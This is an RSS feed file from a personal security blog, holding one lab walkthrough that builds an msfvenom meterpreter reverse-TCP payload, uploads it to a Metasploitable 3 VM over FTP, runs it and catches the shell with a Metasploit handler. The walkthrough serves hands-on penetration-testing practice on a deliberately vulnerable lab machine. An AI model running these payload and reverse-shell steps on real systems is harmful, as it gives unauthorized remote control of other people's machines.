@@ -1,0 +1,225 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Msfvenom on Abril Jordan Casinillo</title><link>https://abriljordan.github.io/ajcasinillo/tags/msfvenom/</link><description>Recent content in Msfvenom on Abril Jordan Casinillo</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 18 Jun 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://abriljordan.github.io/ajcasinillo/tags/msfvenom/index.xml" rel="self" type="application/rss+xml"/><item><title>Reverse shell - msfvenom</title><link>https://abriljordan.github.io/ajcasinillo/p/reverse-shell-msfvenom/</link><pubDate>Sun, 18 Jun 2023 00:00:00 +0000</pubDate><guid>https://abriljordan.github.io/ajcasinillo/p/reverse-shell-msfvenom/</guid><description>&lt;h2 id="target-metasploitable-3-linux">Target: Metasploitable 3 Linux
+&lt;/h2>&lt;h2 id="tool-metasploit">Tool: Metasploit
+&lt;/h2>&lt;h2 id="vulnerability-reverse-shell">Vulnerability: Reverse shell
+&lt;/h2>&lt;p>Reverse shell&lt;/p>
+&lt;p>Step 1: We will first need to create a payload for our Metasploitable VM.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; msfvenom -p linux/x86/meterpreter/reverse_tcp &lt;span class="nv">LHOST&lt;/span>&lt;span class="o">=&lt;/span>10.0.2.16 &lt;span class="nv">LPORT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">5555&lt;/span> -f elf -o reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> exec: msfvenom -p linux/x86/meterpreter/reverse_tcp &lt;span class="nv">LHOST&lt;/span>&lt;span class="o">=&lt;/span>10.0.2.16 &lt;span class="nv">LPORT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">5555&lt;/span> -f elf -o reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Overriding user environment variable &lt;span class="s1">&amp;#39;OPENSSL_CONF&amp;#39;&lt;/span> to &lt;span class="nb">enable&lt;/span> legacy functions.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> No arch selected, selecting arch: x86 from the payload
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">No encoder specified, outputting raw payload
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Payload size: &lt;span class="m">123&lt;/span> bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Final size of elf file: &lt;span class="m">207&lt;/span> bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Saved as: reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; file reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> exec: file reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reverse-sh.elf: ELF 32-bit LSB executable, Intel 80386, version &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>SYSV&lt;span class="o">)&lt;/span>, statically linked, no section header
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Step 2: Place the payload file on the target machine using ftp.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">┌─&lt;span class="o">[&lt;/span>parrot@parrot&lt;span class="o">]&lt;/span>─&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└──╼ &lt;span class="nv">$ftp&lt;/span> 10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connected to 10.0.2.28.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">220&lt;/span> ProFTPD 1.3.5 Server &lt;span class="o">(&lt;/span>ProFTPD Default Installation&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.0.2.28&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Name &lt;span class="o">(&lt;/span>10.0.2.28:parrot&lt;span class="o">)&lt;/span>: vagrant
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">331&lt;/span> Password required &lt;span class="k">for&lt;/span> vagrant
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">230&lt;/span> User vagrant logged in
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Remote system &lt;span class="nb">type&lt;/span> is UNIX.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Using binary mode to transfer files.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp&amp;gt; put reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">local: reverse-sh.elf remote: reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">229&lt;/span> Entering Extended Passive Mode &lt;span class="o">(||&lt;/span>&lt;span class="p">|&lt;/span>3046&lt;span class="p">|&lt;/span>&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp: Can&lt;span class="s1">&amp;#39;t connect to `10.0.2.28:3046&amp;#39;&lt;/span>: Connection timed out
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">200&lt;/span> EPRT &lt;span class="nb">command&lt;/span> successful
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">150&lt;/span> Opening BINARY mode data connection &lt;span class="k">for&lt;/span> reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">100% &lt;span class="p">|&lt;/span>***********************************&lt;span class="p">|&lt;/span> &lt;span class="m">207&lt;/span> 1.57 MiB/s 00:00 ETA
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">226&lt;/span> Transfer &lt;span class="nb">complete&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">207&lt;/span> bytes sent in 00:00 &lt;span class="o">(&lt;/span>29.30 KiB/s&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Already connected to 10.0.2.28, use close first.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp&amp;gt; ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">200&lt;/span> EPRT &lt;span class="nb">command&lt;/span> successful
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">150&lt;/span> Opening ASCII mode data connection &lt;span class="k">for&lt;/span> file list
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-r--r-- &lt;span class="m">1&lt;/span> vagrant vagrant &lt;span class="m">86562816&lt;/span> Oct &lt;span class="m">29&lt;/span> &lt;span class="m">2020&lt;/span> VBoxGuestAdditions.iso
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-r--r-- &lt;span class="m">1&lt;/span> vagrant vagrant &lt;span class="m">207&lt;/span> Feb &lt;span class="m">21&lt;/span> 03:10 reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">226&lt;/span> Transfer &lt;span class="nb">complete&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp&amp;gt; by
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">221&lt;/span> Goodbye.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌─&lt;span class="o">[&lt;/span>parrot@parrot&lt;span class="o">]&lt;/span>─&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└──╼ $
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Step 3: Make this file executable on our Metasploitable VM.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">┌─&lt;span class="o">[&lt;/span>parrot@parrot&lt;span class="o">]&lt;/span>─&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└──╼ &lt;span class="nv">$ssh&lt;/span> vagrant@10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The authenticity of host &lt;span class="s1">&amp;#39;10.0.2.28 (10.0.2.28)&amp;#39;&lt;/span> can&lt;span class="s1">&amp;#39;t be established.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">ED25519 key fingerprint is SHA256:Rpy8shmBT8uIqZeMsZCG6N5gHXDNSWQ0tEgSgF7t/SM.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">This key is not known by any other names.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">Warning: Permanently added &amp;#39;&lt;/span>10.0.2.28&lt;span class="s1">&amp;#39; (ED25519) to the list of known hosts.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">vagrant@10.0.2.28&amp;#39;&lt;/span>s password:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Welcome to Ubuntu 14.04.6 LTS &lt;span class="o">(&lt;/span>GNU/Linux 3.13.0-170-generic x86_64&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> * Documentation: https://help.ubuntu.com/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Last login: Wed Feb &lt;span class="m">21&lt;/span> 02:47:29 &lt;span class="m">2024&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vagrant@metasploitable3-ub1404:~$ chmod +x reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vagrant@metasploitable3-ub1404:~$ ls -al reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rwxr-xr-x &lt;span class="m">1&lt;/span> vagrant vagrant &lt;span class="m">207&lt;/span> Feb &lt;span class="m">21&lt;/span> 03:10 reverse-sh.elf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Step 4: Open a new terminal. Establish the listener for the reverse connection which our payload will be sending to our machine.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; use exploit/multi/handler
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using configured payload generic/shell_reverse_tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> lhost 10.0.2.16
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">lhost&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; 10.0.2.16
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> lport &lt;span class="m">5555&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">lport&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; &lt;span class="m">5555&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> payload linux/x86/meterpreter/reverse_tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">payload&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; linux/x86/meterpreter/reverse_tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; run
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Started reverse TCP handler on 10.0.2.16:5555
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Sending stage &lt;span class="o">(&lt;/span>&lt;span class="m">1017704&lt;/span> bytes&lt;span class="o">)&lt;/span> to 10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Meterpreter session &lt;span class="m">1&lt;/span> opened &lt;span class="o">(&lt;/span>10.0.2.16:5555 -&amp;gt; 10.0.2.28:43945&lt;span class="o">)&lt;/span> at 2024-02-21 03:19:30 +0000
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Step 5: Execute the payload on our target. Navigate back to terminal screen with the established SSH connection. Then, type the following:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">vagrant@metasploitable3-ub1404:~$ ./reverse-sh.elf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Step 6: Return to the terminal screen which is running the Metasploit listener. You will see a meterpreter session has started and is now open. We have sucessfully established a stable shell! We can access the shell by typing “shell” into meterpreter. We can return to the Meterpreter interface from the shell by typing “exit” into the shell.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>Meterpreter 1&lt;span class="o">)(&lt;/span>/home/vagrant&lt;span class="o">)&lt;/span> &amp;gt; shell
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Process &lt;span class="m">1930&lt;/span> created.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Channel &lt;span class="m">1&lt;/span> created.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">uname -a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux metasploitable3-ub1404 3.13.0-170-generic &lt;span class="c1">#220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vagrant
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">id
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>900&lt;span class="o">(&lt;/span>vagrant&lt;span class="o">)&lt;/span> &lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>900&lt;span class="o">(&lt;/span>vagrant&lt;span class="o">)&lt;/span> &lt;span class="nv">groups&lt;/span>&lt;span class="o">=&lt;/span>900&lt;span class="o">(&lt;/span>vagrant&lt;span class="o">)&lt;/span>,27&lt;span class="o">(&lt;/span>sudo&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">exit&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>Meterpreter 1&lt;span class="o">)(&lt;/span>/home/vagrant&lt;span class="o">)&lt;/span> &amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item></channel></rss>
